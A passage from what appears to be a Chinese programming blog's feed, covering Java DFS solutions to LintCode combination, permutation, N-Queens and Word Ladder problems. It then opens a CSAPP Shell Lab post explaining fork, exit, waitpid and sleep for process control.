<li>由点及面（通过一个点找到其他联通的所有点）</li>
<li>拓扑排序</li>
</ol>
<p>碰到找<strong>所有方案</strong>的题，一定是DFS。90%的DFS的题要么是排列<code>O(n!)</code>，要么是组合<code>O(2^n)</code> ，都是NP问题。而BFS的时间复杂度一般是<code>O(n + m)</code>属于p问题。</p>
<p>DFS一般使用递归来实现，非递归方法难度较大。</p>
<h2 id="DFS时间复杂度"><a href="#DFS时间复杂度" class="headerlink" title="DFS时间复杂度"></a>DFS时间复杂度</h2><p><a href="http://www.jiuzhang.com/qa/2994/" target="_blank" rel="noopener">http://www.jiuzhang.com/qa/2994/</a></p>
<p>O(答案个数 * 构造每个答案的时间)</p>
<h1 id="排列组合问题"><a href="#排列组合问题" class="headerlink" title="排列组合问题"></a>排列组合问题</h1><blockquote>
<p>递归三要素：递归的定义、递归的拆解、递归的出口。</p>
</blockquote>
<h2 id="Example1-Combination-Sum"><a href="#Example1-Combination-Sum" class="headerlink" title="Example1: Combination Sum"></a>Example1: Combination Sum</h2><p><a href="http://www.lintcode.com/problem/combination-sum/" target="_blank" rel="noopener">Combination Sum</a>这道题给定一个数组（所有数都是整数），给一个target，求出所有和等于target的子数组。</p>
<p>考虑用DFS递归实现去解这道题:</p>
<ul>
<li>递归的定义：找到所有满足和等于target的子数组，并扔到result中</li>
<li>递归的拆解：维护一个startIndex变量（确保subset中的元素是增序），从下标为startIndex开始，尝试将每个元素num[i]加入到子数组中，递归去找和等于target-num[i]的子数组</li>
<li>当target = 0时候，将当前的子数组加入到result中并返回，如果target已经小于0了，则停止搜索。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">if</span>(candidates.length == <span class="number">0</span>) <span class="keyword">return</span> results;</span><br><span class="line">    Arrays.sort(candidates);</span><br><span class="line">    helper(candidates, target, <span class="number">0</span>, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(<span class="keyword">int</span>[] candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startInd, ArrayList&lt;Integer&gt; header)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(target &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(target == <span class="number">0</span>)&#123;</span><br><span class="line">        results.add(<span class="keyword">new</span> ArrayList&lt;&gt;(header));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = startInd; i &lt; candidates.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i != startInd &amp;&amp; candidates[i] == candidates[i-<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        header.add(candidates[i]);</span><br><span class="line">        helper(candidates, target - candidates[i], i, header);</span><br><span class="line">        header.remove(header.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里startIndex的作用是保证子数组递增，且一个元素可以被选择多次。第17-19代码的作用是去重，这部分重复是由于candidates中带有重复元素造成的（去重操作不能在找到所有的子数组之后再去重），例如candidates=[1,1],target=2。在不加这三行代码的时候结果会是[[1,1],[1,1],[1,1]]。解决的方法就是选代表法，遇到candidates中的重复元素时，只取第一个元素。</p>
<p>FollowUp: <a href="http://www.lintcode.com/en/problem/combination-sum-ii/" target="_blank" rel="noopener">Combination Sum ii</a> 不允许一个元素被选择多次，只需将递归helper中startIndex参数改成i+1即可。</p>
<h2 id="Example2-Permutation"><a href="#Example2-Permutation" class="headerlink" title="Example2: Permutation"></a>Example2: Permutation</h2><p><a href="http://www.lintcode.com/problem/permutations/" target="_blank" rel="noopener">Permutation</a>是一个排列问题，给一个数组，求出所有可能的permutations。依旧使用递归去做。因为这道题没有要求子数组的顺序，所以用两个数组，remains数组用来存放尚未选择过的元素，beginWith是用来当前已经构建出来的数组。</p>
<ul>
<li>递归的定义：以beginWith开头，找到remains数组的全排列，加入到results中</li>
<li>递归的拆解：遍历remains中的每个元素，尝试将其加入beginWith中，继续递归。需要同时更新remains和beginWith</li>
<li>递归的出口：remains函数为空时，就把beginWith加入results</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; permute(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">        results.add(<span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    ArrayList&lt;Integer&gt; beginWith = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    ArrayList&lt;Integer&gt; remains = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        remains.add(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    helper(results, beginWith, remains);</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; results, ArrayList&lt;Integer&gt; beginWith,  ArrayList&lt;Integer&gt; remains)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(remains.isEmpty())&#123;</span><br><span class="line">        results.add(beginWith);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; remains.size(); i++)&#123;</span><br><span class="line">        beginWith.add(remains.get(i));</span><br><span class="line">        <span class="keyword">int</span> del = remains.remove(i);</span><br><span class="line">        helper(results, <span class="keyword">new</span> ArrayList&lt;&gt;(beginWith), remains);</span><br><span class="line">        remains.add(i, del);</span><br><span class="line">        beginWith.remove(beginWith.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FollowUp: <a href="http://www.lintcode.com/problem/permutations-ii/" target="_blank" rel="noopener">Permutation ii</a>如果nums中含有重复数字，而返回的结果中不能有重复，需要怎么做？思路与上面Combination sum的去重思路相同。对于重复的元素，只取第一个元素，即在helper函数的for循环中加入<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; remains.get(i) == remains.get(i-<span class="number">1</span>))&#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Example3-N-Queens"><a href="#Example3-N-Queens" class="headerlink" title="Example3: N Queens"></a>Example3: N Queens</h2><p><a href="http://www.lintcode.com/problem/n-queens/" target="_blank" rel="noopener">N Queens</a> dfs中非常经典的N皇后问题，使用递归去做，递归中使用数组cols来存储每一行的第几列放置皇后（因为肯定要每行放一个才能满足条件)</p>
<ul>
<li>递归的定义：</li>
<li>递归的拆解：对于下一列，遍历所有可以放置皇后的位置，添加到cols中，进行递归</li>
<li>递归的出口：所有列都已经放好，则将此次结果加入到results中</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;String&gt;&gt; solveNQueens(<span class="keyword">int</span> n) &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    search(results, <span class="keyword">new</span> ArrayList&lt;Integer&gt;(), n);</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">search</span><span class="params">(List&lt;List&lt;String&gt;&gt; results, List&lt;Integer&gt; cols, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cols.size() == n) &#123;</span><br><span class="line">        results.add(drawChessboard(cols));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> colIndex = <span class="number">0</span>; colIndex &lt; n; colIndex++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isValid(cols, colIndex)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cols.add(colIndex);</span><br><span class="line">        search(results, cols, n);</span><br><span class="line">        cols.remove(cols.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;String&gt; <span class="title">drawChessboard</span><span class="params">(List&lt;Integer&gt; cols)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; chessboard = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cols.size(); i++) &#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols.size(); j++) &#123;</span><br><span class="line">            sb.append(j == cols.get(i) ? <span class="string">'Q'</span> : <span class="string">'.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        chessboard.add(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> chessboard;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(List&lt;Integer&gt; cols, <span class="keyword">int</span> column)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> row = cols.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> rowIndex = <span class="number">0</span>; rowIndex &lt; cols.size(); rowIndex++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cols.get(rowIndex) == column) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rowIndex + cols.get(rowIndex) == row + column) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rowIndex - cols.get(rowIndex) == row - column) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Graph图中的搜索"><a href="#Graph图中的搜索" class="headerlink" title="Graph图中的搜索"></a>Graph图中的搜索</h1><h2 id="Example-Word-Ladder-ii"><a href="#Example-Word-Ladder-ii" class="headerlink" title="Example: Word Ladder ii"></a>Example: Word Ladder ii</h2><p><a href="http://www.lintcode.com/problem/word-ladder-ii/" target="_blank" rel="noopener">Word Ladder ii</a>这道题是word ladder(求最短路径)的follow up，需要求出所有的最短路径。这道题即要求所有，又要求最短，所以要DFS和BFS同时使用。我们的思路是</p>
<ol>
<li>从end出发做一遍层级遍历(DFS)，求出每个点到end的最短距离，构造一个distance(HashMap<string, int="">)</string,></li>
<li>从start出发开始做BFS， 其中在拓展下一个单词的时候，我们只选择<strong>在dict中且到end的距离小于当前节点到end的距离</strong>的结点，这样能够保证我们不走弯路，求出的路径是最短路径。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; findLadders(String start, String end, Set&lt;String&gt; dict) &#123;</span><br><span class="line">    dict.add(end);</span><br><span class="line">    dict.add(start);</span><br><span class="line">    HashMap&lt;String, Integer&gt; distance = dfs(end, dict);</span><br><span class="line">    ArrayList&lt;String&gt; begin = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    begin.add(start);</span><br><span class="line">    bfs(start, end, dict, begin, distance);</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bfs</span><span class="params">(String start, String end, Set&lt;String&gt; dict, ArrayList&lt;String&gt; header, HashMap&lt;String, Integer&gt; distance)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start.equals(end))&#123;</span><br><span class="line">        results.add(<span class="keyword">new</span> ArrayList&lt;String&gt;(header));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; start.length(); i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> a = <span class="string">'a'</span>; a &lt;= <span class="string">'z'</span>; a++)&#123;</span><br><span class="line">            String newWord = start.substring(<span class="number">0</span>, i) + a + start.substring(i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(dict.contains(newWord) &amp;&amp; distance.get(start) &gt; distance.get(newWord))&#123;</span><br><span class="line">                header.add(newWord);</span><br><span class="line">                bfs(newWord, end, dict, header, distance);</span><br><span class="line">                header.remove(header.size() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> HashMap&lt;String, Integer&gt; <span class="title">dfs</span><span class="params">(String end, Set&lt;String&gt; dict)</span></span>&#123;</span><br><span class="line">    Queue&lt;String&gt; queue = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">    queue.offer(end);</span><br><span class="line">    Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;(); </span><br><span class="line">    set.add(end);</span><br><span class="line">    HashMap&lt;String, Integer&gt; distance = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size;i ++)&#123;</span><br><span class="line">            String word = queue.poll();</span><br><span class="line">            distance.put(word, len);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; word.length(); j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">char</span> a = <span class="string">'a'</span>; a &lt;= <span class="string">'z'</span>; a++)&#123;</span><br><span class="line">                    String newWord = word.substring(<span class="number">0</span>, j) + a + word.substring(j+<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(!set.contains(newWord) &amp;&amp; dict.contains(newWord))&#123;</span><br><span class="line">                        queue.offer(newWord);</span><br><span class="line">                        set.add(newWord);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> distance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> NineChapter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP-Shell Lab]]></title>
      <url>/2018/03/14/CSAPP/Shell_Lab/</url>
      <content type="html"><![CDATA[<p>Shell Lab要求自己实现一个shell，支持jobs, bg, fg操作和调用可执行文件，能够捕捉CtrlZ CtrlC等键盘输入。旨在帮我们理解进程控制和信号机制。</p>
<a id="more"></a>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="进程调度中会用到的函数"><a href="#进程调度中会用到的函数" class="headerlink" title="进程调度中会用到的函数"></a>进程调度中会用到的函数</h2><h3 id="获取进程ID"><a href="#获取进程ID" class="headerlink" title="获取进程ID"></a>获取进程ID</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys.types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpid(<span class="keyword">void</span>); <span class="comment">// 返回调用进程的PID</span></span><br><span class="line"><span class="keyword">pid_t</span> getppid(<span class="keyword">void</span>);<span class="comment">// 返回父进程的PID</span></span><br></pre></td></tr></table></figure>
<h3 id="创建子进程"><a href="#创建子进程" class="headerlink" title="创建子进程"></a>创建子进程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure>
<p>新创建的子进程的得到与父进程用户级虚拟地址空间相同的但是独立的一份拷贝，包括文本、数据、bss段、堆以及用户栈。最大的区别就是与父进程的PID不同。</p>
<p>例子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pid = Fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Child: x = %d\n"</span>, ++x);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Parent: x = %d\n"</span>, --x);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个程序的执行结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Parent: x = 0</span><br><span class="line">Child: x = 2</span><br></pre></td></tr></table></figure></p>
<p>主要明确的几点是:</p>
<ul>
<li><strong>fork只被调用一次，却会返回两次</strong>： 一次在父进程中，会返回子进程的pid；另一次在子进程中，返回0</li>
<li><strong>并发执行</strong>：子进程和父进程是并发运行的独立进程，内核能够以任意方式交替执行它逻辑控制流中的指令。并不能确定是父进程先执行完还是子进程先。</li>
<li><strong>相同但是独立的地址空间</strong>：每个进程有相同的用户栈、本地变量值、相同的堆、相同的全局变量。但是他们所作的任何改变都是独立的，不会反映在另一个进程的存储器中。</li>
</ul>
<h3 id="终止子进程"><a href="#终止子进程" class="headerlink" title="终止子进程"></a>终止子进程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span></span><br></pre></td></tr></table></figure>
<p>exit函数以status退出状态来终止进程。</p>
<p>从程序员的角度一般认为进程总是处于以下三种状态之一：</p>
<ol>
<li>运行：进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</li>
<li>停止：进程的执行被挂起（suspend），且不会被调度，当收到SIGSTOP，SIGTSTP，SIGTTIN或者SIGTTOU信号时，进程就停止，知道收到一个SIGCONT信号，这时候进程再次开始运行。</li>
<li>终止：进程永远停止了，有三种可能：收到一个信号，该信号的默认行为是终止进程；从主函数返回；调用exit函数。</li>
</ol>
<h3 id="回收子进程-waitpid"><a href="#回收子进程-waitpid" class="headerlink" title="回收子进程: waitpid"></a>回收子进程: waitpid</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/tyeps.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *status, <span class="keyword">int</span> options);</span><br></pre></td></tr></table></figure>
<p>默认地(当options = 0时)，waitpid挂起调用进程的执行，直到它的等待集合中的一个子进程终止。</p>
<p>pid参数:判定等待集合的成员</p>
<ul>
<li>如果pid&gt;0 那么等待集合就是一个单独的子进程，它的进程ID等于pid</li>
<li>如果pid=-1,那么等待集合就是由父进程所有的子进程组成</li>
</ul>
<p>options参数：修改默认行为<br>可以通过将options设置为常亮WNOHANG和WUNTRACED的各种组合修改默认行为。</p>
<ul>
<li>WNOHANG：如果等待集合中的任何子进程都还没有终止，那么久立即返回。</li>
<li>WUNTRACED：挂起调用进程的执行，直到等待集合中的一个进程变成已终止或者被停止。</li>
<li>WNOHANG|WUNTRACED: 立即返回，如果等待集合中没有任何子进程被停止或已终止，那么返回值为0，或者返回值等于那个被停止或者已终止的子进程的PID</li>
</ul>
<p>status参数:检查已回收子进程的退出状态<br>如果status参数非空，那么waitpid就会在status参数中放上关于导致返回的子进程的状态信息。就可以利用status来检查已回收的子进程的退出状态：</p>
<ul>
<li>WIFEXIED(status)：如果子进程通过调用exit或者一个返回正常终止，就返回真</li>
<li>WEXITSTATUS(status)：返回一个正常终止的子进程的退出状态。只有在WIFEXITED返回为真时，才会定义这个状态</li>
<li>WIFSIGNALED(status)：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。</li>
<li>WTERMSIG(status)：返回导致子进程终止的信号的数量，只有在WIFSIGNALED返回为真时，才定义这个状态。</li>
<li>WIFSTOPEED(status)：如果引起返回的子进程当前是停止的，那么就返回真。</li>
<li>WSTOPSIG(status)：返回引起子进程挺值得信号的数量。只有在WIFSTOPPED返回为真时才定义这个状态。</li>
</ul>
<p>错误条件：<br>如果调用进程没有子进程，那么waitpid返回-1并设置errno为ECHILD；如果waitpid函数被一个信号中断，那么它返回-1并设置errno为EINTR。</p>
<h3 id="令进程休眠"><a href="#令进程休眠" class="headerlink" title="令进程休眠"></a>令进程休眠</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure>
<p>sleep 函数让进程挂起一段执行的时间。如果请求的时间量已经到了，sleep返回0，否则返回还剩下要休眠的秒数。后一种情况发生在sleep函数被一个信号中断而过早地返回。</p>
